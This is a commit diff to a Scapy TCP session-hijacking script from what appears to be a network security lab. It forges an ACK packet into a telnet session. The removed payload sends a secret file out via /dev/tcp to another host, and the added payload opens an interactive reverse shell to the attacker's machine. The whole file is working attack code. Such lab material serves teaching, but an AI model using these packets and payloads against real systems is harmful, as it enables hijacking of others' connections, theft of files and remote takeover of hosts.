3800e7ae5067defa299457ac7dc1b1abd16cdc58
cappetta <thomas.cappetta@gmail.com>
2020-11-07 16:57:32 -0500

    AWS-30: updating w/ modified sessionhijack script

--- lab3_tcp_attacks/sessionhijack.py
+++ lab3_tcp_attacks/sessionhijack.py
@@ -3,10 +3,10 @@ import sys
 from scapy.all import *
 
 print("SENDING SESSION HIJACKING PACKET.........")
-IPLayer = IP(src="10.0.2.68", dst="10.0.2.69")
-TCPLayer = TCP(sport=46716, dport=23, flags="A",
-               seq=588544000, ack=2397299038)
-Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.70/9090\r"
+IPLayer = IP(src="192.168.1.40", dst="192.168.1.66")
+TCPLayer = TCP(sport=45966, dport=23, flags="A",
+               seq=4262020013, ack=1073092278)
+Data = "bash -i >& /dev/tcp/192.168.1.40/9090 0>&1\r"
 pkt = IPLayer/TCPLayer/Data
 ls(pkt)
 send(pkt,verbose=0)
